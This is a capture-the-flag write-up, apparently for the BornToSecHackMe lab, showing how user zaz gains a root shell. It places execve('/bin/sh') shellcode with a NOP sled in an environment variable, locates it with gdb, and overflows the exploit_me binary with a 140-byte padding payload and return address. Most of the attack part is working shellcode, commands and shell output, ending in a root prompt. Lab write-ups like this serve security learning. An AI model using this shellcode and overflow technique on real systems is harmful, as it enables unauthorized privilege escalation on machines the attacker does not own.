# Zaz alternative root shell

This is an alternative way to obtain a root shell from the zaz user.

We will use the buffer overflow again. This time we are not trying to access the `/bin/sh` address. Instead we will use a shellcode to open the root shell.

We will even work our way as if there were canary protection against stack address modifications.

First let's inject our shellcode inside an environement variable, this way we will be able to point our program to this variable later, instead of directly injecting the shellcode in the buffer overflow, and modifying the stack.

```
export SHELLCODE=`python -c 'print "\x90" * 900 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"'`
```

Our shellcode also has 900 `\x90` inside it, called "nop", it will help us for "aiming" at the right address and avoid memory padding problems. Once we manage to point inside the Nops, the programm will jump from nop to nop until it find the beginning of our shellcode.

Let's find the address of our "SHELLCODE" environment variable.

```
gdb exploit_me
(gdb) b *main
(gdb) r
(gdb) x/s *((char **)environ+0)
0xbffff56f: "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...     
```

This will show us the most recent environment variable, which is SHELLCODE. Now let's an address in the middle of the nopsled:

```
(gdb) x/150xg 0xbffff56f
0xbffff56f:     0x444f434c4c454853      0x9090909090903d45                                                                                         
0xbffff57f:     0x9090909090909090      0x9090909090909090
0xbffff58f:     0x9090909090909090      0x9090909090909090                                                                                         
0xbffff59f:     0x9090909090909090      0x9090909090909090                                                                                         
0xbffff5af:     0x9090909090909090      0x9090909090909090                                                                                         
0xbffff5bf:     0x9090909090909090      0x9090909090909090                                                                                         
0xbffff5cf:     0x9090909090909090      0x9090909090909090                                                                                         
0xbffff5df:     0x9090909090909090      0x9090909090909090                                                                                         
0xbffff5ef:     0x9090909090909090      0x9090909090909090                                                                                         
0xbffff5ff:     0x9090909090909090      0x9090909090909090                                                                                         
0xbffff60f:     0x9090909090909090      0x9090909090909090                                                                                         
0xbffff61f:     0x9090909090909090      0x9090909090909090                                                                                         
0xbffff62f:     0x9090909090909090      0x9090909090909090                                                                                         
0xbffff63f:     0x9090909090909090      0x9090909090909090                                                                                         
0xbffff64f:     0x9090909090909090      0x9090909090909090                                                                                         
0xbffff65f:     0x9090909090909090      0x9090909090909090                                                                                         
0xbffff66f:     0x9090909090909090      0x9090909090909090                                                                                         
0xbffff67f:     0x9090909090909090      0x9090909090909090                                                                                         
0xbffff68f:     0x9090909090909090      0x9090909090909090                                                                                         
0xbffff69f:     0x9090909090909090      0x9090909090909090                                                                                         
0xbffff6af:     0x9090909090909090      0x9090909090909090                                                                                         
0xbffff6bf:     0x9090909090909090      0x9090909090909090                                                                                         
0xbffff6cf:     0x9090909090909090      0x9090909090909090                                                                                         
0xbffff6df:     0x9090909090909090      0x9090909090909090                                                                                         
0xbffff6ef:     0x9090909090909090      0x9090909090909090                                                                                         
0xbffff6ff:     0x9090909090909090      0x9090909090909090                                                                                         
0xbffff70f:     0x9090909090909090      0x9090909090909090                                                                                         
0xbffff71f:     0x9090909090909090      0x9090909090909090                                                                                         
0xbffff72f:     0x9090909090909090      0x9090909090909090 
0xbffff73f:     0x9090909090909090      0x9090909090909090                                                                                         
0xbffff74f:     0x9090909090909090      0x9090909090909090                                                                                         
0xbffff75f:     0x9090909090909090      0x9090909090909090                                                                                        
0xbffff76f:     0x9090909090909090      0x9090909090909090                                                                                         
0xbffff77f:     0x9090909090909090      0x9090909090909090                                                                                         
0xbffff78f:     0x9090909090909090      0x9090909090909090                                                                                         
0xbffff79f:     0x9090909090909090      0x9090909090909090                                                                                         
0xbffff7af:     0x9090909090909090      0x9090909090909090                                                                                         
0xbffff7bf:     0x9090909090909090      0x9090909090909090                                                                                         
0xbffff7cf:     0x9090909090909090      0x9090909090909090                                                                                         
0xbffff7df:     0x9090909090909090      0x9090909090909090                                                                                         
0xbffff7ef:     0x9090909090909090      0x9090909090909090                                                                                         
0xbffff7ff:     0x9090909090909090      0x9090909090909090                                                                                         
0xbffff80f:     0x9090909090909090      0x9090909090909090                                                                                         
0xbffff81f:     0x9090909090909090      0x9090909090909090                                                                                         
0xbffff82f:     0x9090909090909090      0x9090909090909090                                                                                         
0xbffff83f:     0x9090909090909090      0x9090909090909090                                                                                         
0xbffff84f:     0x9090909090909090      0x9090909090909090                                                                                         
0xbffff85f:     0x9090909090909090      0x9090909090909090                                                                                         
0xbffff86f:     0x9090909090909090      0x9090909090909090                                                                                         
0xbffff87f:     0x9090909090909090      0x9090909090909090                                                                                         
0xbffff88f:     0x9090909090909090      0x9090909090909090                                                                                         
0xbffff89f:     0x9090909090909090      0x9090909090909090                                                                                         
0xbffff8af:     0x9090909090909090      0x9090909090909090                                                                                         
0xbffff8bf:     0x9090909090909090      0x9090909090909090                                                                                         
0xbffff8cf:     0x9090909090909090      0x9090909090909090                                                                                         
0xbffff8df:     0x9090909090909090      0x9090909090909090                                                                                         
0xbffff8ef:     0x9090909090909090      0x1feb909090909090                                                                                         
0xbffff8ff:     0x4688c0310876895e      0xf3890bb00c468907                                                                                        
0xbffff90f:     0x80cd0c568d084e8d      0xe880cd40d889db31                                                                                         
0xbffff91f:     0x6e69622fffffffdc      0x4c4548530068732f                                                                                         
0xbffff92f:     0x622f6e69622f3d4c      0x4d52455400687361
```

Let's pick the address : `0xbffff73f` who is located in the middle of the nopsled. Now we translate for the asm : `\x3f\xf7\xff\xbf`

As explained the writeup2.md, the buffer overflow offset is 140, so we will use that knowledge in our input.
We will make the program to the SHELLCODE variable with the buffer overflow, who will execute our shellcode:

```
./exploit_me $(python -c 'print "i"*140 + "\x3f\xf7\xff\xbf"')
```
zaz@BornToSecHackMe:~$ ./exploit_me $(python -c 'print "i"*140 + "\x3f\xf7\xff\xbf"')                                                              iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii?      
pwd                                                                                                                                              
/home/zaz                                                                                                                                          
whoami                                                                                                                                     
root                                                                                                                                               
```

We are root ! :3 UwU